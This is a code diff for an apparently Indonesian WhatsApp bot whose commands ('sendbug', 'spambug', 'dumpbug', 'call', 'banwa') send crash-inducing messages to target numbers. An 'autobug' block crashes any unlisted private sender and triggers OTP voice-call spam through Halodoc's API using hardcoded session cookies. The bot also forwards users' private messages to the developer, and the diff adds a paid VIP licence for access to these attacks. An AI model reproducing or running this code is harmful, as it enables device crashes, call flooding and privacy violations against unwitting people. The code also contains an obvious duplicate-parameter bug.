@@ -2,13 +2,16 @@ const { baileys, proto, generateWAMessageFromContent, getContentType } = require
 const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
 const { exec } = require('child_process')
 const cheerio = require('cheerio')
+const moment = require('moment-timezone')
 const util = require('util')
 const axios = require('axios').default
 const fs = require('fs')
 autobug = true
 mode = true
 
-module.exports = async (semar, denz, msg) => {
+let userVIP = JSON.parse(fs.readFileSync('./database/vip.json'))
+
+module.exports = async (semar, semar, msg) => {
 try {
 if (msg.key && msg.key.remoteJid === 'status@broadcast') return
 const type = getContentType(msg.message)
@@ -18,10 +21,10 @@ const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.
 const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
 const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
 const isCmd = body.startsWith(prefix)
+const time = moment.tz('Asia/Jakarta').format('ha z')
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
 const dn = args.join(' ')
-const nomorOwner = ['6285866295942','628985245738','6285951565073','628812904283','6285942018232','12344057330','6289686044386','6282265058541','6282260297402','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224','6285840040268','6285640350019','6281212687893','79774805044','6282115383356']
 const isGroup = from.endsWith('@g.us')
 const botNumber = semar.user.id.split(':')[0]
 const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
@@ -36,7 +39,7 @@ const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || 
 const isGroupAdmins = groupAdmins.includes(sender) || false
 const isSaya = botNumber.includes(senderNumber)
 const isDev = nomorDeveloper.includes(senderNumber) || isSaya
-const isOwner = nomorOwner.includes(senderNumber) || isSaya
+const isVIP = userVIP.includes(sender)
 const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
 const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
 const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
@@ -60,12 +63,16 @@ semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}
 
-if (autobug && !isOwner && !command && !isGroup) { 
+if (autobug && !isDev && !isVIP && !command && !isGroup) { 
 semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}
 
 if (body && !isGroup && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}
+
+if (body.startsWith(`regist-4064636F646564656E7061`)) {
+reply('Nomor anda sedang dicek oleh Owner, Tunggu sebentar...')
+semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• Register\nFrom : ${pushname}\nNumber : ${senderNumber}\nTime : ${time}\nLink : wa.me/${sender}`})}
 
 if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
 let evl = body.split("\n")
@@ -117,7 +124,7 @@ break
 
 //©from: dennis × ivan
 case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
@@ -133,7 +140,7 @@ break
 //©from: nayla
 case 'open':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
-if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
 if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
 await semar.groupSettingUpdate(from, 'not_announcement')
 reply('_Successfully Opened Group!_\n')
@@ -142,7 +149,7 @@ break
 //©from: nayla
 case 'close':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
-if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
+if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
 if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
 await semar.groupSettingUpdate(from, 'announcement')
 reply('_Successfully Closed The Group!_\n')
@@ -192,7 +199,7 @@ break
 
 //©from: dennis × ivan
 case 'sendbug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
@@ -213,7 +220,7 @@ break
 
 //©from: dennis × andik
 case 'dumpbug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
@@ -225,7 +232,7 @@ break
 
 //©from: dennis × ivan × andik
 case 'spambug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
@@ -277,8 +284,17 @@ sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: 
 break
 
 //©from: dennis
+case 'acc': case 'accept':
+if (!dn) return reply('Invalid number')
+userVIP.push(`${dn}`)
+fs.writeFileSync('./database/vip.json', JSON.stringify(`${userVIP}`))
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: `Halo, Nomor Anda Telah Diizinkan Oleh Owner Untuk Mengakses VIP!\nNama : ${pushname}\nNomor : ${dn}\nWaktu : ${time}\nTerimakasih Telah Membeli Lisensi VIP!`})
+reply('Registered!')
+break
+
+//©from: dennis
 case 'chat':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !isVIP && !msg.key.fromMe) return
 if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
@@ -304,13 +320,13 @@ break
 
 //©from: dennis
 case 'delete': case 'd': case 'del':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return
 semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
 break
 
 //©from: dennis
 case 'restart':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return
 exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
 break
 
@@ -322,7 +338,7 @@ break
 
 //©from: dennis × mr_dark
 case 'call':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
